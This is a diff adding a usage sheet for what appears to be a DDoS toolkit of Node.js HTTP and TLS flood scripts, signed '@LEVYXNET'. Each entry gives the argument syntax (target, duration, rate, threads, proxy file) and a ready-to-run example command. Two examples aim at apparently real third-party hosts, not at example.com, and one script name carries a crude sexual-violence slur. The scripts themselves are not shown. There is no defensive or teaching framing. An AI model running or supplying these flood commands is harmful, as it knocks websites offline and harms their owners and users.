@@ -1,0 +1,25 @@
+node HTTP-FLOOD.js [TARGET] [TIME] [RATE] [THREAD] [PROXYFILE]
+node HTTP-FLOOD.js https://example.com 60 8 30 PROXY.txt
+-------------------
+node HTTP-SPAM.js [TARGET] [TIME] [RATE] [THREAD] [PROXYFILE]
+node HTTP-SPAM.js https://example.com 60 8 30 PROXY.txt
+-------------------
+node STRONG-KILLER.js [TARGET] [TIME] [RATE] [THREAD] [PROXYFILE]
+node STRONG-KILLER.js https://example.com 60 8 30 PROXY.txt
+-------------------
+node TLS-LEVYX.js [TARGET] [TIME] [RATE] [THREAD] [PROXYFILE]
+node TLS-LEVYX.js https://example.com 60 8 30 PROXY.txt
+-------------------
+node TLSV2.js [TARGET] [TIME] [RATE] [THREAD] [PROXYFILE]
+node TLSV2.js https://example.com 60 8 30 PROXY.txt
+-------------------
+node TLSV3.js [TARGET] [TIME] [RATE] [THREAD] [PROXYFILE]
+node TLSV3.js https://example.com 60 8 30 PROXY.txt
+-------------------
+node UAM-RAPE.js [TARGET] [THREAD] [TIME]
+node UAM-RAPE.js https://file.cunhua.today 30 200
+-------------------
+node BROWSER.js [TARGET] [TIME] [RATE] [THREAD] [PROXYFILE]
+node SUPER-FLOOD.js https://tls.mrrage.xyz/nginx_status 60 800 30 PROXY.txt
+-------------------
+@LEVYXNET
